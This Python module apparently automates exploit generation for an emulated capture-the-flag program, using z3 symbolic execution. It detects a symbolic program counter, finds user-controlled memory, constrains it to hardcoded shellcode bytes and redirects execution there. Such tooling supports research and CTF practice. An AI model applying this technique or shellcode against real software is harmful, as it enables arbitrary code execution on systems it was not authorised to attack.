from enum import Enum
from z3 import simplify, is_bv, BitVecNumRef

class VulnReason(Enum):
    """
    Enumerate reasons we thing we can exploit a program
    """
    SYMBOLIC_PC = 0

def is_symbolic(state, val):
    """
    return whether or not a value is symbolic within a state
    """
    if not is_bv(val):
        return False

    val = simplify(val)
    return not isinstance(val, BitVecNumRef)

def is_exploitable(state):
    """
    Return whether a state is symbolic, and why we think it is

    Returns (bool, VulnReason)
    """
    if is_symbolic(state, state.cpu.registers['R0']):
        return True, VulnReason.SYMBOLIC_PC
    return False, None

def is_controllable(state, val):
    """
    Check that :val: is completely user-controlled in state
    """
    # TODO: check state.path.pred() does not constrain val
    # (or we could constrain to 0..255 and check sat?
    return is_symbolic(state, val)

def find_controlled_bytes(state, n_bytes):
    """
    Find a region of `n_bytes` consecutive bytes that are totally controllable
    """
    for base, _ in enumerate(state.memory):
        if all(is_symbolic(state, x) for x in state.memory[base : base + n_bytes]):
            return base

def constrain_shellcode(state):
    """
    Find a place in memory where we can put shellcode,
    constrain it to those values, and return (constrained_state, shellcode_start_addr)
    """
    # TODO: Generate this in response to constraints?
    # short, NULL-avoiding shellcode
    shellcode = b'\x7f\x43\x8f\x10\x02\x4f\x33\x12\x7e\x40\x10\xff\x8e\x12'

    constrained_state = state.clone()
    shellcode_start_addr = find_controlled_bytes(constrained_state, len(shellcode))

    # constrain shellcode memory
    for i, val in enumerate(shellcode):
        constrained_state.path.add( \
                constrained_state.memory[shellcode_start_addr + i] == val)

    # TODO: try another place if unsat until we run out of valid locations
    assert constrained_state.path.is_sat(), \
            'Could not constrain memory to put shellcode!'

    return constrained_state, shellcode_start_addr

def generate_symbolic_ip_exploit(state):
    """
    Do all the work to setup a state to be exploitable.
    
    You should be able to take the input from this and throw it at the program to get unlock.
    """

    constrained_state, shellcode_addr = constrain_shellcode(state)
    constrained_state.path.add(constrained_state.cpu.registers['R0'] == shellcode_addr)
    return constrained_state

def generate_exploit(state):
    """
    Given a state, return a new state such that the input causes the program to be exploited
    """
    exploitable, vuln_reason = is_exploitable(state)
    assert exploitable

    if vuln_reason == VulnReason.SYMBOLIC_PC:
        return generate_symbolic_ip_exploit(state)
    else:
        raise NotImplementedError('Exploitation for VulnReason:', vuln_reason)
